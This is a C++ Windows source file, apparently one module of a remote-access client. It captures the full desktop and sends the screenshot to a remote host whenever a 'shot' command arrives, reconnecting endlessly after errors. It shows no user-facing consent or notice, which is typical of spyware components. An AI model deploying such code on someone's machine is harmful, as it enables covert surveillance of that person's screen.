#include "Screen.h"

Screen::Screen(char* ip, short port) {
    _communication = new Communication(ip, port);
    _screen = GetDesktopWindow();
}

void Screen::shotScreen() {
    HDC hwindowDC, hwindowCompatibleDC;

    int height, width, srcheight, srcwidth;
    HBITMAP hbwindow;
    cv::Mat src;
    string frame = SCREEN;
    BITMAPINFOHEADER  bi;

    hwindowDC = GetDC(_screen);
    hwindowCompatibleDC = CreateCompatibleDC(hwindowDC);
    SetStretchBltMode(hwindowCompatibleDC, COLORONCOLOR);

    RECT windowsize;
    GetClientRect(_screen, &windowsize);

    srcheight = windowsize.bottom;
    srcwidth = windowsize.right;
    height = windowsize.bottom;
    width = windowsize.right;

    src.create(height, width, CV_8UC4);

    // Create a bitmap
    hbwindow = CreateCompatibleBitmap(hwindowDC, width, height);
    bi.biSize = sizeof(BITMAPINFOHEADER);
    bi.biWidth = width;
    bi.biHeight = -height;  // negative height to ensure top-down bitmap
    bi.biPlanes = 1;
    bi.biBitCount = 32;
    bi.biCompression = BI_RGB;
    bi.biSizeImage = 0;
    bi.biXPelsPerMeter = 0;
    bi.biYPelsPerMeter = 0;
    bi.biClrUsed = 0;
    bi.biClrImportant = 0;

    // Use the previously created device context with the bitmap
    SelectObject(hwindowCompatibleDC, hbwindow);
    // Copy from the window device context to the bitmap device context
    StretchBlt(hwindowCompatibleDC, 0, 0, width, height, hwindowDC, 0, 0, srcwidth, srcheight, SRCCOPY);
    GetDIBits(hwindowCompatibleDC, hbwindow, 0, height, src.data, (BITMAPINFO*)&bi, DIB_RGB_COLORS);

    DeleteObject(hbwindow);
    DeleteDC(hwindowCompatibleDC);
    ReleaseDC(_screen, hwindowDC);

    imwrite(frame, src);
}

void Screen::run() {
    while (true) {
        try {
            if (_communication->getMsg() == "shot") {
                shotScreen();
                _communication->sendFile(SCREEN);
                Sleep(2000);
            }
        }
        catch (...) {
            while (!_communication->connect()) {}
        }
    }
}
